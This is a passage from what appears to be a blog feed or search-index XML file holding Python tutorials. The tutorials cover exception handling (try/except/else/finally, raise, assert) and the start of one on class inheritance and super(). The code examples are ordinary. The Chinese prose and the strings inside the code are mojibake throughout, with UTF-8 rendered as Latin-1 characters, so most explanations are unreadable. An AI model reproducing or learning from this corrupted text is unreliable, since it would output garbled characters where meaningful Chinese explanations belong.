result)</span><br></pre></td></tr></table></figure><ul><li>å½“ <code>Python</code> è§£é‡Šå™¨ <strong>æŠ›å‡ºå¼‚å¸¸</strong>æ—¶ï¼Œ<strong>æœ€åä¸€è¡Œé”™è¯¯ä¿¡æ¯çš„ç¬¬ä¸€ä¸ªå•è¯ï¼Œå°±æ˜¯é”™è¯¯ç±»å‹</strong></li></ul><h3 id="å¼‚å¸¸æ•è·å®Œæ•´è¯­æ³•">å¼‚å¸¸æ•è·å®Œæ•´è¯­æ³•</h3><ul><li>åœ¨å®é™…å¼€å‘ä¸­ï¼Œä¸ºäº†èƒ½å¤Ÿå¤„ç†å¤æ‚çš„å¼‚å¸¸æƒ…å†µï¼Œå®Œæ•´çš„å¼‚å¸¸è¯­æ³•å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># å°è¯•æ‰§è¡Œçš„ä»£ç </span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> é”™è¯¯ç±»å‹<span class="number">1</span>:</span><br><span class="line">    <span class="comment"># é’ˆå¯¹é”™è¯¯ç±»å‹1ï¼Œå¯¹åº”çš„ä»£ç å¤„ç†</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> é”™è¯¯ç±»å‹<span class="number">2</span>:</span><br><span class="line">    <span class="comment"># é’ˆå¯¹é”™è¯¯ç±»å‹2ï¼Œå¯¹åº”çš„ä»£ç å¤„ç†</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> (é”™è¯¯ç±»å‹<span class="number">3</span>, é”™è¯¯ç±»å‹<span class="number">4</span>):</span><br><span class="line">    <span class="comment"># é’ˆå¯¹é”™è¯¯ç±»å‹3 å’Œ 4ï¼Œå¯¹åº”çš„ä»£ç å¤„ç†</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> result:</span><br><span class="line">    <span class="comment"># æ‰“å°é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># æ²¡æœ‰å¼‚å¸¸æ‰ä¼šæ‰§è¡Œçš„ä»£ç </span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># æ— è®ºæ˜¯å¦æœ‰å¼‚å¸¸ï¼Œéƒ½ä¼šæ‰§è¡Œçš„ä»£ç </span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ— è®ºæ˜¯å¦æœ‰å¼‚å¸¸ï¼Œéƒ½ä¼šæ‰§è¡Œçš„ä»£ç &quot;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>else</code> æ”¾åœ¨ except:åé¢åªæœ‰åœ¨æ²¡æœ‰å¼‚å¸¸æ—¶æ‰ä¼šæ‰§è¡Œçš„ä»£ç ï¼Œæœ‰å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œå°±ä¸ä¼šå†æ‰§è¡Œï¼ˆå³ä½¿ä½ è¿›è¡Œäº†å¼‚å¸¸æ•è·ï¼‰</li><li><code>finally</code> æ— è®ºæ˜¯å¦æœ‰å¼‚å¸¸ï¼Œéƒ½ä¼šæ‰§è¡Œçš„ä»£ç </li></ul><h4 id="æ•è·æœªçŸ¥é”™è¯¯">æ•è·æœªçŸ¥é”™è¯¯</h4><ul><li>åœ¨å¼€å‘æ—¶ï¼Œ<strong>è¦é¢„åˆ¤åˆ°æ‰€æœ‰å¯èƒ½å‡ºç°çš„é”™è¯¯</strong>ï¼Œè¿˜æ˜¯æœ‰ä¸€å®šéš¾åº¦çš„</li><li>å¦‚æœå¸Œæœ›ç¨‹åº <strong>æ— è®ºå‡ºç°ä»»ä½•é”™è¯¯</strong>ï¼Œéƒ½ä¸ä¼šå› ä¸º<code>Python</code> è§£é‡Šå™¨<strong>æŠ›å‡ºå¼‚å¸¸è€Œè¢«ç»ˆæ­¢</strong>ï¼Œä¸€èˆ¬åœ¨æœ€åå¢åŠ ä¸€ä¸ª<code>except</code></li></ul><p>è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æœªçŸ¥é”™è¯¯ %s&quot;</span> % result)</span><br></pre></td></tr></table></figure><h4 id="å¼‚å¸¸ç±»å‹æ•è·æ¼”ç»ƒ-è¦æ±‚ç”¨æˆ·è¾“å…¥æ•´æ•°">å¼‚å¸¸ç±»å‹æ•è·æ¼”ç»ƒ â€”â€”è¦æ±‚ç”¨æˆ·è¾“å…¥æ•´æ•°</h4><p><strong>éœ€æ±‚</strong></p><ol type="1"><li>æç¤ºç”¨æˆ·è¾“å…¥ä¸€ä¸ªæ•´æ•°</li><li>ä½¿ç”¨ <code>8</code> é™¤ä»¥ç”¨æˆ·è¾“å…¥çš„æ•´æ•°å¹¶ä¸”è¾“å‡º</li></ol><p><strong>å®Œæ•´æ•è·å¼‚å¸¸</strong> çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥æ•´æ•°ï¼š&quot;</span>))</span><br><span class="line">    result = <span class="number">8</span> / num</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯·è¾“å…¥æ­£ç¡®çš„æ•´æ•°&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;é™¤ 0 é”™è¯¯&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æœªçŸ¥é”™è¯¯ %s&quot;</span> % result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ­£å¸¸æ‰§è¡Œ&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ‰§è¡Œå®Œæˆï¼Œä½†æ˜¯ä¸ä¿è¯æ­£ç¡®&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="å¼‚å¸¸ä¼ é€’">å¼‚å¸¸ä¼ é€’</h1><ul><li><strong>å¼‚å¸¸çš„ä¼ é€’</strong> â€”â€” å½“ <strong>å‡½æ•°/æ–¹æ³•</strong> æ‰§è¡Œ<strong>å‡ºç°å¼‚å¸¸</strong>ï¼Œä¼š å°†<strong>å¼‚å¸¸ä¼ é€’</strong> ç»™ å‡½æ•°/æ–¹æ³•çš„ <strong>è°ƒç”¨ä¸€æ–¹</strong></li><li>å¦‚æœ <strong>ä¼ é€’åˆ°ä¸»ç¨‹åº</strong>ï¼Œä»ç„¶<strong>æ²¡æœ‰å¼‚å¸¸å¤„ç†</strong>ï¼Œç¨‹åºæ‰ä¼šè¢«ç»ˆæ­¢</li></ul><p>æç¤ºï¼š</p><ul><li>åœ¨å¼€å‘ä¸­ï¼Œå¯ä»¥åœ¨ä¸»å‡½æ•°ä¸­å¢åŠ  <strong>å¼‚å¸¸æ•è·</strong></li><li>è€Œåœ¨ä¸»å‡½æ•°ä¸­è°ƒç”¨çš„å…¶ä»–å‡½æ•°ï¼Œåªè¦å‡ºç°å¼‚å¸¸ï¼Œéƒ½ä¼šä¼ é€’åˆ°ä¸»å‡½æ•°çš„<strong>å¼‚å¸¸æ•è·</strong> ä¸­</li><li>è¿™æ ·å°±ä¸éœ€è¦åœ¨ä»£ç ä¸­ï¼Œå¢åŠ å¤§é‡çš„<strong>å¼‚å¸¸æ•è·</strong>ï¼Œèƒ½å¤Ÿä¿è¯ä»£ç çš„æ•´æ´</li></ul><p><strong>éœ€æ±‚</strong></p><ol type="1"><li>å®šä¹‰å‡½æ•° <code>demo1()</code><strong>æç¤ºç”¨æˆ·è¾“å…¥ä¸€ä¸ªæ•´æ•°å¹¶ä¸”è¿”å›</strong></li><li>å®šä¹‰å‡½æ•° <code>demo2()</code> è°ƒç”¨ <code>demo1()</code></li><li>åœ¨ä¸»ç¨‹åºä¸­è°ƒç”¨ <code>demo2()</code></li></ol><h2 id="æŠ›å‡º-raise-å¼‚å¸¸">æŠ›å‡º <code>raise</code> å¼‚å¸¸</h2><h3 id="åº”ç”¨åœºæ™¯">åº”ç”¨åœºæ™¯</h3><ul><li>åœ¨å¼€å‘ä¸­ï¼Œé™¤äº† <strong>ä»£ç æ‰§è¡Œå‡ºé”™</strong> <code>Python</code>è§£é‡Šå™¨ä¼š <strong>æŠ›å‡º</strong> å¼‚å¸¸ä¹‹å¤–</li><li>è¿˜å¯ä»¥æ ¹æ® <strong>åº”ç”¨ç¨‹åº</strong> <strong>ç‰¹æœ‰çš„ä¸šåŠ¡éœ€æ±‚</strong><strong>ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸</strong></li></ul><h3 id="æŠ›å‡ºå¼‚å¸¸">æŠ›å‡ºå¼‚å¸¸</h3><p>BaseException æ˜¯æ‰€æœ‰å¼‚å¸¸çš„åŸºç±» Exception æ˜¯å¸¸è§„é”™è¯¯çš„åŸºç±»</p><p>å¦‚æœæˆ‘ä»¬ä¸å¤ªæ˜ç¡®å¼‚å¸¸çš„ç±»å‹ï¼ŒåªçŸ¥é“å¯èƒ½å‡ºç°å¸¸è§„é”™è¯¯ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨<code>Exception</code>åŸºç±»åˆ›å»ºå¯¹è±¡ã€‚å¦‚æœæˆ‘ä»¬æ¸…é™¤å¼‚å¸¸ç±»å‹ï¼Œé‚£å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªå¯¹åº”ç±»å‹çš„å¼‚å¸¸é˜Ÿå½¢ï¼Œæ¯”å¦‚ï¼š<code>TypeError</code> å¼‚å¸¸å¯¹è±¡</p><p>æ¯”å¦‚ï¼šåœ¨å¼€å‘æ—¶ï¼Œå¦‚æœæ»¡è¶³ç‰¹å®šä¸šåŠ¡éœ€æ±‚æ—¶å¸Œæœ›æŠ›å‡ºå¼‚å¸¸ï¼Œå¯ä»¥:</p><ol type="1"><li><strong>åˆ›å»º</strong> ä¸€ä¸ª <code>Exception</code> çš„<strong>å¯¹è±¡</strong>ï¼Œä¼ å…¥é”™è¯¯ä¿¡æ¯å‚æ•°</li><li>ä½¿ç”¨ <code>raise</code> <strong>å…³é”®å­—</strong> æŠ›å‡º<strong>å¼‚å¸¸å¯¹è±¡</strong> è¿™é‡Œæœ‰ raise è¯­å¥å’Œ raise å‡½æ•°ä¸¤ç§é€‰æ‹©</li></ol><h3 id="æŠ›å‡º-typeerror-å¼‚å¸¸">æŠ›å‡º TypeError å¼‚å¸¸</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## raise è¯­å¥</span></span><br><span class="line"><span class="keyword">raise</span> TypeError(<span class="string">&quot;å‚æ•°ç±»å‹ä¸æ­£ç¡®&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## raise å‡½æ•°</span></span><br><span class="line"><span class="keyword">raise</span>(TypeError(<span class="string">&quot;å‚æ•°ç±»å‹ä¸æ­£ç¡®&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">## æ›´å¯ä»¥</span></span><br><span class="line">ex = Exception(<span class="string">&#x27;å¯†ç é•¿åº¦ä¸å¤Ÿ&#x27;</span>)</span><br><span class="line"><span class="keyword">raise</span> (ex)</span><br></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹-2">ç¤ºä¾‹ 2</h3><ul><li>æç¤ºç”¨æˆ· <strong>è¾“å…¥å¯†ç </strong>ï¼Œå¦‚æœ <strong>é•¿åº¦å°‘äº8</strong>ï¼ŒæŠ›å‡º <strong>å¼‚å¸¸</strong></li></ul><p>æ³¨æ„</p><ul><li>å½“å‰å‡½æ•° <strong>åªè´Ÿè´£</strong> æç¤ºç”¨æˆ·è¾“å…¥å¯†ç ï¼Œå¦‚æœ<strong>å¯†ç é•¿åº¦ä¸æ­£ç¡®ï¼Œéœ€è¦å…¶ä»–çš„å‡½æ•°è¿›è¡Œé¢å¤–å¤„ç†</strong></li><li>å› æ­¤å¯ä»¥ <strong>æŠ›å‡ºå¼‚å¸¸</strong>ï¼Œç”±å…¶ä»–éœ€è¦å¤„ç†çš„å‡½æ•°<strong>æ•è·å¼‚å¸¸</strong></li></ul><p><strong>éœ€æ±‚</strong></p><ul><li>å®šä¹‰ <code>input_password</code> å‡½æ•°ï¼Œæç¤ºç”¨æˆ·è¾“å…¥å¯†ç </li><li>å¦‚æœç”¨æˆ·è¾“å…¥é•¿åº¦ &lt; 8ï¼ŒæŠ›å‡ºå¼‚å¸¸</li><li>å¦‚æœç”¨æˆ·è¾“å…¥é•¿åº¦ &gt;=8ï¼Œè¿”å›è¾“å…¥çš„å¯†ç </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">input_passwd</span>():</span><br><span class="line">    <span class="comment"># 1. tell user to input password</span></span><br><span class="line">    pwd = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥å¯†ç :&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. åˆ¤æ–­å¯†ç é•¿åº¦ &gt;= 8, è¿”å›ç”¨æˆ·å¯†ç </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwd) &gt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">return</span> pwd</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. å¦‚æœ &lt; 8, æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;raise an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># create Exception object</span></span><br><span class="line">    ex = Exception(<span class="string">&#x27;å¯†ç é•¿åº¦ä¸å¤Ÿ&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># raise an exception actively</span></span><br><span class="line">    <span class="keyword">raise</span> (ex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(input_passwd())</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> result:</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="æ–­è¨€">æ–­è¨€</h2><p>The simple form, assert expression, is equivalent to</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">__debug__</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> expression: <span class="keyword">raise</span> AssertionError</span><br></pre></td></tr></table></figure><p>The extended form, assert expression1, expression2, is equivalentto</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">__debug__</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> expression1: <span class="keyword">raise</span> AssertionError(expression2)</span><br></pre></td></tr></table></figure><p>Assignments to <strong>debug</strong> are illegal. The value for thebuilt-in variable is determined when the interpreter starts.</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">54</span>]: <span class="keyword">assert</span> <span class="number">1</span>==<span class="number">2</span>,<span class="string">&quot;1 ä¸ç­‰äº 2&quot;</span></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">AssertionError                            Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">54</span>-4e6a0102cb72&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> <span class="keyword">assert</span> <span class="number">1</span>==<span class="number">2</span>,<span class="string">&quot;1 ä¸ç­‰äº 2&quot;</span></span><br><span class="line"></span><br><span class="line">AssertionError: <span class="number">1</span> ä¸ç­‰äº <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="å¸¸è§-python-å¼‚å¸¸ç±»å‹">å¸¸è§ Python å¼‚å¸¸ç±»å‹</h3><p>FileNotFoundErrorï¼šæ‰¾ä¸åˆ°æŒ‡å®šæ–‡ä»¶çš„å¼‚å¸¸ NameErrorï¼šæœªå£°æ˜ oræœªåˆå§‹åŒ–å¯¹è±¡ï¼ˆæ²¡æœ‰å±æ€§ï¼‰BaseExceptionï¼šæ‰€æœ‰å¼‚å¸¸çš„åŸºç±»ï¼ˆçˆ¶ç±»ï¼‰ï¼Œå³åŒ…å«æ‰€æœ‰çš„å¼‚å¸¸</p><p>å‚è€ƒæ–‡ç« :</p><p><ahref="https://blog.csdn.net/weixin_45459224/article/details/97487245#python_77">pythonä¸­å¼‚å¸¸æ•è·çš„å®Œæ•´è¯­æ³•å’Œå¸¸è§çš„å¼‚å¸¸ç±»å‹</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python inheritance</title>
      <link href="/blog/2020/03/22/programming/python/2.object-oriented/inherit/"/>
      <url>/blog/2020/03/22/programming/python/2.object-oriented/inherit/</url>
      
        <content type="html"><![CDATA[<h1 id="ç»§æ‰¿">ç»§æ‰¿</h1><h2 id="ç›®æ ‡">ç›®æ ‡</h2><ul><li>å•ç»§æ‰¿</li><li>å¤šç»§æ‰¿</li></ul><h2 id="é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§">é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§</h2><ol type="1"><li><strong>å°è£…</strong>æ ¹æ®<strong>èŒè´£</strong>å°†<strong>å±æ€§</strong>å’Œ<strong>æ–¹æ³•</strong>å°è£…åˆ°ä¸€ä¸ªæŠ½è±¡çš„ç±»ä¸­</li><li><strong>ç»§æ‰¿</strong>å®ç°ä»£ç çš„é‡ç”¨ï¼Œç›¸åŒçš„ä»£ç ä¸éœ€è¦é‡å¤çš„ç¼–å†™</li><li><strong>å¤šæ€</strong>ä¸åŒçš„å¯¹è±¡è°ƒç”¨ç›¸åŒçš„æ–¹æ³•ï¼Œäº§ç”Ÿä¸åŒçš„æ‰§è¡Œç»“æœï¼Œ<strong>å¢åŠ ä»£ç çš„çµæ´»åº¦</strong></li></ol><h2 id="æ¦‚å¿µ">æ¦‚å¿µ</h2><p>å­ç±»æ‹¥æœ‰çˆ¶ç±»çš„æ‰€æœ‰æ–¹æ³•å’Œå±æ€§ã€‚</p><h2 id="è¯­æ³•">è¯­æ³•</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ç±»å</span>ï¼ˆçˆ¶ç±»åï¼‰</span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><strong>å­ç±»</strong>ç»§æ‰¿è‡ª<strong>çˆ¶ç±»</strong>ï¼Œå¯ä»¥ç›´æ¥æ‹¥æœ‰çˆ¶ç±»çš„æ‰€æœ‰å±æ€§ï¼Œå¹¶ä½¿ç”¨çˆ¶ç±»ä¸­å·²ç»å°è£…å¥½çš„æ–¹æ³•ï¼Œä¸éœ€è¦å†æ¬¡å¼€å‘</p><p>å­ç±»ä¸­åº”è¯¥æ ¹æ®<strong>èŒè´£</strong>ï¼Œå°è£…<strong>å­ç±»ç‰¹æœ‰çš„å±æ€§å’Œæ–¹æ³•</strong>ã€‚</p><h2 id="ä¸“ä¸šæœ¯è¯­">ä¸“ä¸šæœ¯è¯­</h2><p>Dog ç±»æ˜¯ Animal ç±»çš„å­ç±»ï¼ŒAnimal ç±»æ˜¯ Dog ç±»çš„çˆ¶ç±»ï¼Œ Dog ç±»ä» Animalç±»ç»§æ‰¿</p><p>Dog ç±»æ˜¯ Animal ç±»çš„æ´¾ç”Ÿç±»ï¼ŒAnimal ç±»æ˜¯ Dog ç±»çš„åŸºç±»ï¼ŒDog ç±»ä» Animalç±»æ´¾ç”Ÿ</p><h2 id="ç»§æ‰¿çš„ä¼ é€’æ€§">ç»§æ‰¿çš„ä¼ é€’æ€§</h2><ul><li><p>C ç±»ä» B ç±»ç»§æ‰¿ï¼ŒB ç±»åˆä» A ç±»ç»§æ‰¿</p></li><li><p>é‚£ä¹ˆ C ç±»å°±å…·æœ‰ B ç±»å’Œ Aç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•å­ç±»æ‹¥æœ‰<code>çˆ¶ç±»</code>ä»¥åŠ<code>çˆ¶ç±»çš„çˆ¶ç±»</code>ä¸­å°è£…çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•</p></li></ul><h2 id="æ–¹æ³•çš„é‡å†™">æ–¹æ³•çš„é‡å†™</h2><ul><li><p>å­ç±»æ‹¥æœ‰çˆ¶ç±»çš„æ‰€æœ‰æ–¹æ³•å’Œå±æ€§</p></li><li><p>å­ç±»ç»§æ‰¿è‡ªçˆ¶ç±»ï¼Œå¯ä»¥ç›´æ¥äº«å—çˆ¶ç±»ä¸­å·²ç»å°è£…å¥½çš„æ–¹æ³•ï¼Œä¸éœ€è¦å†æ¬¡å¼€å‘</p></li></ul><p>åº”ç”¨åœºæ™¯</p><ul><li>å½“çˆ¶ç±»çš„æ–¹æ³•å®ç°ä¸èƒ½æ»¡è¶³å­ç±»éœ€æ±‚æ—¶ï¼Œå¯ä»¥å¯¹æ–¹æ³•è¿›è¡Œ<strong>é‡å†™ï¼ˆoverrideï¼‰</strong></li></ul><p>é‡å†™çˆ¶ç±»æ–¹æ³•æœ‰ä¸¤ç§æƒ…å†µï¼š</p><ol type="1"><li>è¦†ç›–çˆ¶ç±»çš„æ–¹æ³•</li><li>å¯¹çˆ¶ç±»æ–¹æ³•è¿›è¡Œæ‰©å±•</li></ol><h3 id="è¦†ç›–çˆ¶ç±»çš„æ–¹æ³•">è¦†ç›–çˆ¶ç±»çš„æ–¹æ³•</h3><p>å¦‚æœåœ¨å¼€å‘ä¸­ï¼Œçˆ¶ç±»çš„æ–¹æ³•å®ç°å’Œå­ç±»çš„æ–¹æ³•å®ç°ï¼Œå®Œå…¨ä¸åŒ,å°±å¯ä»¥ä½¿ç”¨<strong>è¦†ç›–</strong>çš„æ–¹å¼ï¼Œåœ¨å­ç±»ä¸­<strong>é‡æ–°ç¼–å†™</strong>çˆ¶ç±»çš„æ–¹æ³•å®ç°</p><p>å…·ä½“çš„å®ç°æ–¹å¼ï¼Œå°±ç›¸å½“äºåœ¨<strong>å­ç±»ä¸­</strong>å®šä¹‰äº†ãƒ¼ä¸ª<strong>å’Œçˆ¶ç±»åŒåçš„æ–¹æ³•å¹¶ä¸”å®ç°é‡å†™</strong>ä¹‹åï¼Œåœ¨è¿è¡Œæ—¶ï¼Œ<strong>åªä¼šè°ƒç”¨</strong>å­ç±»ä¸­é‡å†™çš„æ–¹æ³•ï¼Œè€Œä¸å†ä¼šè°ƒç”¨<strong>çˆ¶ç±»å°è£…çš„æ–¹æ³•</strong></p><h3 id="å¯¹çˆ¶ç±»æ–¹æ³•è¿›è¡Œæ‰©å±•">å¯¹çˆ¶ç±»æ–¹æ³•è¿›è¡Œæ‰©å±•</h3><p>å¦‚æœåœ¨å¼€å‘ä¸­ï¼Œå­ç±»çš„æ–¹æ³•å®ç°ä¸­åŒ…å«çˆ¶ç±»çš„æ–¹æ³•å®ç°</p><ul><li>çˆ¶ç±»åŸæœ¬å°è£…çš„æ–¹æ³•å®ç°æ˜¯å­ç±»æ–¹æ³•çš„ä¸€éƒ¨åˆ†</li></ul><p>å°±å¯ä»¥ä½¿ç”¨<strong>æ‰©å±•</strong>çš„æ–¹å¼</p><ol type="1"><li>åœ¨å­ç±»ä¸­<strong>é‡å†™</strong>çˆ¶ç±»çš„æ–¹æ³•</li><li>åœ¨éœ€è¦çš„ä½ç½®ä½¿ç”¨ <code>super().çˆ¶ç±»æ–¹æ³•</code>æ¥è°ƒç”¨çˆ¶ç±»æ–¹æ³•çš„æ‰§è¡Œ</li><li>ä»£ç å…¶ä»–çš„ä½ç½®é’ˆå¯¹å­ç±»çš„éœ€æ±‚ï¼Œç¼–å†™<strong>å­ç±»ç‰¹æœ‰çš„ä»£ç å®ç°</strong></li></ol><p><strong>å…³äº super</strong></p><ul><li><p>åœ¨ Python ä¸­ <code>super</code>æ˜¯ä¸€ä¸ª<strong>ç‰¹æ®Šçš„ç±»</strong></p></li><li><p><code>super()</code> å°±æ˜¯ä½¿ç”¨ <code>super</code>ç±»åˆ›å»ºå‡ºæ¥çš„å¯¹è±¡</p></li><li><p><strong>æœ€å¸¸</strong>ä½¿ç”¨çš„åœºæ™¯å°±æ˜¯åœ¨<strong>é‡å†™çˆ¶ç±»æ–¹æ³•æ—¶</strong>ï¼Œè°ƒç”¨<strong>åœ¨çˆ¶ç±»ä¸­å°è£…çš„æ–¹æ³•å®ç°</strong></p></li></ul><p><strong>è°ƒç”¨çˆ¶ç±»æ–¹æ³•çš„å¦å¤–ä¸€ç§æ–¹å¼ï¼ˆçŸ¥é“ï¼‰</strong></p><p>åœ¨ <code>Python2.x</code>æ—¶ï¼Œå¦‚æœéœ€è¦è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çˆ¶ç±»å.æ–¹æ³•(self)</span><br></pre></td></tr></table></figure><p>ãƒ»è¿™ç§æ–¹å¼ï¼Œç›®å‰åœ¨ <code>Python3.x</code> è¿˜æ”¯æŒè¿™ç§æ–¹å¼</p><p>è¿™ç§æ–¹æ³•<code>ä¸æ¨èä½¿ç”¨</code>ï¼Œå› ä¸ºä¸€æ—¦<code>çˆ¶ç±»å‘ç”Ÿå˜åŒ–</code>ï¼Œæ–¹æ³•è°ƒç”¨ä½ç½®çš„<code>ç±»å</code>åŒæ ·éœ€è¦ä¿®æ”¹</p><p>æç¤º</p><ul><li><p>åœ¨å¼€å‘æ—¶ï¼Œ<code>çˆ¶ç±»å</code>å’Œ <code>super()</code>ä¸¤ç§æ–¹å¼ä¸è¦æ··ç”¨</p></li><li><p>å¦‚æœä½¿ç”¨<code>å½“å‰å­ç±»å</code>è°ƒç”¨æ–¹æ³•ï¼Œä¼šå½¢æˆé€’å½’è°ƒç”¨ï¼Œå‡ºç°<code>æ­»å¾ªç¯</code></p></li></ul><h2 id="çˆ¶ç±»çš„ç§æœ‰å±æ€§å’Œç§æœ‰æ–¹æ³•">çˆ¶ç±»çš„ç§æœ‰å±æ€§å’Œç§æœ‰æ–¹æ³•</h2><ol 